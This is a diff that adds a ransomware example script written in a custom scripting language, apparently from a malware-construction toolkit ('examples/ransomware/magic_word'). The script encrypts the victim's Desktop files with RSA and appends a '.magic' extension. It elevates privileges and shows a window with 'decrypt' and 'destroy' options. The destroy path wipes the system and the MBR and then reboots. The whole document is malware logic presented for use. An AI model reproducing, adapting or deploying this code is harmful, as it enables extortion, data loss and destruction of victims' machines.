@@ -1,0 +1,59 @@
+use window
+use system
+use crypto
+use wipe
+
+[
+    version 3.0
+    output magic_word
+    os windows
+    arch amd64
+    obfuscate false
+]
+
+@ Decrypts all encrypted files @
+call decrypt_files -> null {
+    crypto::clean_targets() 
+    crypto::set_method("rsa")    
+    
+    system::list_dir(${"file", "€40€\\Desktop"}$) 
+    foreach("€2€"):
+        crypto::add_target("€13€")
+    end foreach
+
+    crypto::decrypt()
+}
+
+@ Delete malware, then system and mbr @
+call destroy_files -> null {
+    system::wipe_system() 
+    system::reboot()
+}
+
+boot encrypt_files {
+    crypto::generate_rsa_key("2048")
+    crypto::set_method("rsa")
+    crypto::set_extension(".magic")
+
+    system::list_dir(${"file", "€40€\\Desktop"}$)
+    foreach("€1€"):
+        crypto::add_target("€13€") @ Add each file to our target list @
+    end foreach
+
+    crypto::encrypt()
+}
+
+loop window_run {
+    system::elevate()
+    window::bind(${"decrypt", "decrypt_files"}$)
+    window::bind(${"destroy", "destroy_files"}$)
+
+    window::load("$39$/examples/ransomware/magic_word/index.html")
+
+    window::width("800")
+    window::height("600")
+
+
+    window::run()
+    system::exit("1")
+}
